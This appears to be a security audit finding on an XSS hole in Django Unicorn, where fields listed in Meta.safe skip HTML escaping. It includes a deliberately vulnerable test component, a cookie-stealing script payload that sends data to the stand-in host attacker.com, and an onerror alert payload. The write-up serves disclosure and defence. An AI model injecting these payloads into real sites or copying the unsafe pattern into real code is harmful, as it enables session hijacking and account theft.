# VULNERABILITIES

## Cross-Site Scripting (XSS) via Meta.safe Attribute

### Description
Django Unicorn provides developers the ability to mark fields as "safe" (unescaped) using the `Meta.safe` attribute. If a developer marks a field as safe and that field contains user-controlled content, it creates a dangerous XSS vulnerability. By default, Django Unicorn HTML-encodes field values to prevent XSS attacks, but when a field is explicitly added to the `Meta.safe` tuple, this protection is bypassed, allowing raw HTML to be rendered.

### Impact
High. If exploited, an attacker could execute arbitrary JavaScript in the context of the victim's browser, potentially leading to session hijacking, data theft, credential theft, personal data exfiltration, or complete account takeover. This is especially dangerous in applications handling sensitive data or authentication.

### Vulnerability rank
High

### Currently implemented mitigations
The framework escapes HTML by default to prevent XSS (since version 0.36.0, fixing CVE-2021-42053). Developers must explicitly opt out of this protection by adding fields to the `Meta.safe` tuple. The documentation does mention that this is specifically for preventing XSS attacks.

### Missing mitigations
- The framework could provide more prominent warnings about the risks of using `Meta.safe`
- Additional runtime checks could be implemented to detect when user-controlled input is marked as safe
- A content security policy header could be recommended or automatically implemented
- Safer alternatives to `Meta.safe` that allow HTML but sanitize it more thoroughly

### Preconditions
1. A developer must explicitly mark a field as safe using the `Meta.safe` attribute
2. That field must contain user-controlled content
3. An attacker must be able to input malicious content into that field

### Source code analysis
In `views/__init__.py`, we see the code that marks fields as safe:
```python
# Get set of attributes that should be marked as `safe`
safe_fields = []
if hasattr(component, "Meta") and hasattr(component.Meta, "safe"):
    if isinstance(component.Meta.safe, Sequence):
        for field_name in component.Meta.safe:
            if field_name in component._attributes().keys():
                safe_fields.append(field_name)

# Mark safe attributes as such before rendering
for field_name in safe_fields:
    value = getattr(component, field_name)
    if isinstance(value, str):
        setattr(component, field_name, mark_safe(value))  # noqa: S308
```

This code explicitly looks for fields marked as "safe" in the Meta class and applies Django's `mark_safe` function to them, which bypasses HTML escaping. The `noqa: S308` comment suggests this was flagged by a static analyzer as potentially unsafe but the warning was suppressed.

The exploitation path works as follows:
1. A developer creates a component with a field that contains user input
2. The developer marks this field as "safe" in the Meta class
3. A malicious user inputs JavaScript code like `<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>`
4. When the component renders, this code executes in the browser of any user viewing the component

### Security test case
1. Create a new Django project with Django Unicorn installed
2. Create a component with a view that includes user-controlled data and marks it as safe:

```python
from django_unicorn.components import UnicornView

class VulnerableComponentView(UnicornView):
    user_content = ""

    class Meta:
        safe = ("user_content",)
```

3. Create the corresponding template:

```html
<div>
  <h3>User Content:</h3>
  {{ user_content }}

  <input unicorn:model="user_content" type="text" placeholder="Enter some content" />
  <button unicorn:click="$refresh">Update Content</button>
</div>
```

4. Enter a malicious payload such as `<img src="x" onerror="alert(document.cookie)">` into the input field
5. Observe that the JavaScript executes, displaying the cookies in an alert box
6. To confirm it's the `Meta.safe` causing the issue, remove the field from the safe tuple and verify the script is rendered as text instead of being executed
